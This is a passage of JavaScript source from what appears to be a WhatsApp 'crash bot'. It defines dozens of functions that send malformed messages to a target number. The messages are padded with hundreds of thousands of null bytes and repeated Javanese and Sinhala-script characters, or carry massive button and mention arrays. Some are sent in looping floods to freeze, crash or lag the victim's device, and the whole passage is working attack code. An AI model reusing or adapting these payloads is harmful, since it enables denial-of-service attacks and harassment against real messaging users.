                            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"QxZGhost\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Md4k\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"151515\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                            version: 3
                        }
                    }
                }
            }
        }, {
            participant: { jid: target }
        });

        await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });
    }
}

async function harddelayios(sock, target) {
    const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
    while (true) {
        try {
            for (let i = 0; i < 100; i++) {
                const iosphone = await generateWAMessageFromContent(target, {
                    interactiveResponseMessage: {
                        header: {
                            title: "\u0000".repeat(250000)
                        },
                        body: {
                            text: "LoL",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: `{\"flow_cta\":{\"title\":${"\u0000".repeat(60000)}}}`,
                            version: 3
                        }
                    }
                }, {
                    userJid: target
                });

                for (const msg of [iosphone]) {
                    await sock.relayMessage(
                        "status@broadcast",
                        msg, {
                            messageId: null,
                            statusJidList: [target],
                            additionalNodes: [{
                                tag: "meta",
                                attrs: {},
                                content: [{
                                    tag: "mentioned_users",
                                    attrs: {},
                                    content: [{
                                        tag: "to",
                                        attrs: {
                                            jid: target
                                        }
                                    }]
                                }]
                            }]
                        }
                    );
                }
                console.log(`[System] Target Telah Di Tumbang Kan ${target}`);
                await delay(2000);
            }
        } catch (error) {
            console.log(`Error Function Bugs: ${error.message}`);
            await delay(2000);
        }
    }
}

async function freezehomeios(sock, target) {
  try {
    const unicode = "ꦽ".repeat(10000) + "𑇂𑆵𑆴𑆿".repeat(10000) + "𑜦𑜠".repeat(10000);
    await sock.sendMessage(target, { 
      location: { 
        degreesLatitude: -6.200000, 
        degreesLongitude: 106.816666,
        name: "PLEXIPPUS!" + unicode + "\nhttps://t.me/GhostQwertys",
        address: "GHOST!" + unicode
      } 
    });
  } catch (error) {
    console.log(error);
  }
}

async function PahinaCrashios(sock, target) {
  let message = {
    locationMessage: {
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
    } 
  }; 
  
  const msg = await generateWAMessageFromContent(target, message, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta", attrs: {}, content: [{
        tag: "mentioned_users", attrs: {}, content: [{
          tag: "to", attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });
}

async function nomercystuckXFC(sock, target) {
await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "🦠⃟꙰ ܻ⨍ɑׁׅ݊ꪀtׁׅzׁׅ֬ᨮׁׅ֮ ✶⤻꙳‌‌༑ᐧ‌⌁⃰𝐗‌𝐄‌᪳𝐁‌‌᪳𝐎 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ 𝐘𝐎𝐔༑‌⟆"
            },
            nativeFlowMessage: {
              buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "𑇂𑆵𑆴𑆿".repeat(19999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});

await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: {"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(90000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🦠⃟꙰ ܻ⨍ɑׁׅ݊ꪀtׁׅzׁׅ֬ᨮׁׅ֮ ✶⤻꙳‌‌༑ᐧ‌⌁⃰𝐗‌𝐄‌᪳𝐕‌‌᪳𝐎 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ 𝐘𝐎𝐔 ༑‌⟆","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function bcForcee(sock, target, ptcp = false) {
  await sock.relayMessage(target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "祭祀 ⃟༑𝐗𝐄𝐕𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐘𝐎𝐔 精神"
            },
            footer: {
              text: " ⃟༑𝐗𝐄𝐕𝐎 𝐋𝐄𝐖𝐀𝐓☠️"
            },
            contextInfo: {},
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_confirmation",
                  buttonParamsJson: JSON.stringify({
                    booking_id: " ⃟༑𝐅𝐀𝐍𝐓𝐙𝐘 𝐍𝐈𝐇😹",
                    status: "confirmed",
                    business_name: "✩",
                    service_name: "x",
                    appointment_time: "2026-04-28T10:00:00Z",
                    customer: {
                      name: " ⃟༑𝐅𝐀𝐍𝐓𝐙𝐘 𝐈𝐒 𝐇𝐄𝐑𝐄  (!!!) ",
                      phone: "13135550666"
                    }
                  })
                }
              ],
              messageParamsJson: "{".repeat(6666)
            }
          }
        }
      }
    },
    ptcp ? { participant: { jid: target } } : {}
  );
}

async function peler(sock, target) {
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Ghost-Here"
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{{".repeat(10000),
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            participant: { jid: target }
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: { 
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Ghost-Here"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            participant: { jid: target }
        });
    }
}

async function sendAllMessages(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "MakLo"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: {
                value: 999999999999,
                offset: 100
              },
              reference_id: "\u0000".repeat(5000),
              order: {
                status: "pending",
                items: [
                  {
                    name: "𑇂𑆵𑆴𑆿".repeat(9999),
                    amount: { value: 100000, offset: 100 },
                    quantity: 99999
                  }
                ]
              }
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(75000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(9000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function dileyv2(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await new Promise(resolve => setTimeout(resolve, 500));

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(500000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}
async function DelayV3Lexzy(sock, target) {
  const LexMsg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
          }
        ]
      }
    }
  };

  const Nanas = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: "17381601",
          title: "LexzyModss - Executed ",
          fileName: " done bos " + "ꦽ".repeat(75000),
          fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
          directPath: "/v/t62.7119-24/fake.enc",
          mediaKeyTimestamp: "1767975195",
          url: "https://mmg.whatsapp.net/d/fake.enc",
          caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
        }
      }
    }
  };

  const Muda = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
          },
          contextInfo: {
            stanzaId: "metawai_id",
            forwardingScore: 999,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, () => 
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", Nanas, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  await sock.relayMessage("status@broadcast", Muda, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  const startTime = Date.now();
  const duration = 1 * 60 * 1000;

  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(75000),
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1950 },
                  () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ]
            }
          }
        }
      }
    }, { participant: { jid: target } });
  }
}

async function peler(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
}

async function DelayV1(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
sleep(1000);
}

async function DelayXDrain(sock, target) {
  const Nanas = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: "17381601",
          title: "NanasMuda - Executed ",
          fileName: " ah ah ange " + "ꦽ".repeat(50000),
          fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
          directPath: "/v/t62.7119-24/fake.enc",
          mediaKeyTimestamp: "1767975195",
          url: "https://mmg.whatsapp.net/d/fake.enc",
          caption: "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        }
      }
    }
  };

  const Muda = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: " Lexzy Suka Nanas " + "ꦾ".repeat(99999)
          },
          contextInfo: {
            stanzaId: "metawai_id",
            forwardingScore: 999,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, () => 
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", Nanas, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  await sock.relayMessage("status@broadcast", Muda, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  const startTime = Date.now();
  const duration = 1 * 60 * 1000; // 1 menit
  
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(500000),
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1950 },
                  () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ]
            }
          }
        }
      }
    }, { participant: { jid: target } });
  }
}

async function Delaymaklo(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
}
async function bcForcne(sock, target, ptcp = false) {
  await sock.relayMessage(target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "K A N D I ♦♦"
            },
            footer: {
              text: "XXXXXXX"
            },
            contextInfo: {},
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_confirmation",
                  buttonParamsJson: JSON.stringify({
                    booking_id: "X",
                    status: "confirmed",
                    business_name: "✩",
                    service_name: "x",
                    appointment_time: "2026-04-28T10:00:00Z",
                    customer: {
                      name: " (!!!) ",
                      phone: "13135550666"
                    }
                  })
                }
              ],
              messageParamsJson: "{".repeat(6666)
            }
          }
        }
      }
    },
    ptcp ? { participant: { jid: target } } : {}
  );
}
async function sangek(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);
  
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }
 }
   
   


async function freezeeinvis(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
}, { participant: { jid: target }});
}


async function ComboRayapXNanas(sock, target) {
    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: "LexzyModss - Executed¿!"
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "booking_status",
                        ParamsJson: "\u0003".repeat(9000),
                    },
                ],
            },
        },
    }, { participant: { jid: target } });

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "NandoOfficiali - RayapBesi",
                        format: "DEFAULT",
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"/Makluu\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"SYNC\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(75000)}\"}}`,
                        version: 3
                    },
                },
            },
        },
    }, { participant: { jid: target } });
}
async function BlankFreezeChatGroup(sock, target) {
  const msg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  };
  
  const prepared = await generateWAMessageFromContent(target, msg, {});
  await sock.relayMessage(target, prepared.message, {
    messageId: prepared.key.id
  });
}

async function TrashPackStc(sock, target) {
   let Xnull = JSON.stringify({
      action: "data",
      data: "Exerc1st"
    });
  
  const msg = {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "꧀".repeat(15000),
      publisher: "",
      stickers: [{
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: Xnull,
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        stanzaId: "1234567890ABCDEF",
        forwardingScore: 1,
        isForwarded: true,
        fromMe: false,
        participant: "11111111111@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: [
          "6285215587498@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],          	
        quotedMessage: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileLength: "9999999999999",
            pageCount: 1316134911,
            mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
            fileName: ".",
            fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
            directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1724474503",
            contactVcard: true,
            thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
            thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
            thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABQMEBgIBAQEAAAAAAAAAAAAAAAAAAAAA/9oAAMBAAIQAxAAAADSVYqQws0EZq/MSzNBNmbQ9F4XVy+YhU3pCjX2OQNHOtmHgqCx7b8FyL1OOrGdvDuwwlKZZBRws4F/AAAaO5mWQxFQKegOAAADoAAP/8QAJhAAAgICAgAGAwEBAAAAAAAAAQIAAwQREiEFEyIxQWEQIFEUI//aAAgBAQABPnCXXNSCxAKynMqt+jFdGJAYGO6oNsZ5iAAk6ld6WswX4mx+GF4Ynn0JZatzkAd/cFBNQBVR9iZec9NpSgwZ+WCCXlGScrovpo94xjwR9795j32bVgG4QZdjONVnjCQdjY3LsYk7BXeobXoFisewJWhsVmVdtvuZWM6Mp4HRWUbS8TdPEf8AJTqYt7WPwCAKJ0I4uqtDMWjWDgSiEzI9dTMydzw3GqtDDlL8euyriW1xHvLlFdx133ENTVAnazkccg1vsGJdbY5Nh9I+BHr4t7sxhTQ2qDcZKuDebWBuPemHafIOxB4s1ras6WDDFqK6sCIMb0gM+jvqf5VVxvvfzBXZrSkKJzXqeYnXfvPF8prLygPpX84eZbj2L36YpqIU6HY3PQ0ArePcVsH2ZbaVSw77EsYu7Mfk/pTlFqE/oGhPNKqe/dZTk9A79WjBdyUHlsy2xmrYA/rTaQAu/mG4cez2I9gDe/REDEGOx3+u5zb+wuxn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/8QAFExBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAQABPxCH/9k=",
          },
        },
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
    }
  }

  return await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target },
  });
}

async function payMyDickHarder(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) + "\0".repeat(10450),
        buttons: [{ name: "payment_method",     buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4UJPSC1FYKC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"\",\"key\":\"🧬🧬🧬🧬" + "\u0000".repeat(902000) + "</kelra།‌|།slywly.>\",\"key_type\":\"CPF\"}}],\"share_payment_status\":false}",
        }]
      }
    }
  }, {});
}

async function freezeMaklowh(sock, target) {
  let kntl = [];
  kntl.push({
    name: "single_select",
    buttonParamsJson: JSON.stringify({})
  });
  for (let i = 0; i < 20000; i++) {
    kntl.push({
      name: "address_message",
      buttonParamsJson: "\0".repeat(104590)
    });
  }
  
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "hallo"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: kntl
          }
        }
      }
    }
  };
  
  await sock.relayMessage(target, message, {
    messageId: null, participant: { jid: target }
  });
}

async function FcClick(sock, target) {
    const bokep = {
        locationMessage: {
            degreesLongitude: 999999999999.9999,
            degreesLatitude: 999999999999.9999,
            name: "" + "ꦾ".repeat(190000) + "ꦽ".repeat(19000),
            url: "https://stickerPack/" + "ꦾ".repeat(19000),
            address:
                "\u0000" +
                "ꦾ".repeat(19000) +
                "ꦽ".repeat(60000),
            contextInfo: {
                externalAdReply: {
                    renderLargerThumbnail: true,
                    showAdAttribution: true,
                    body:
                        "yoke" +
                        "ꦾ".repeat(19000) +
                        "ꦽ".repeat(50000),

                    title: "\u0000".repeat(19000),
                    sourceUrl:
